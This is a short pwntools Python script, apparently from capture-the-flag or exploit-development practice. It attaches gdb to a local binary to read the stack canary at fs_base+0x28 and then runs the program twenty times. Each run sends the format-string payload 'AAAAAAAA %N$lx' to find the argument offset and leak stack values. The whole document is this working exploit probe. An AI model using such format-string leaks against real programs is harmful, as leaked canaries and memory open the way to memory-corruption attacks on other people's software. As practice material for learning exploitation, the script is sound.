from pwn import *
 
e = ELF("./a.out")
io = e.process()
gdb.attach(io, '''
x/1xg $fs_base+0x28
continue''')
for i in range(20):
        io = e.process(level="error")
        io.sendline(b"AAAAAAAA %%%d$lx" % i)
        io.recvline()
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()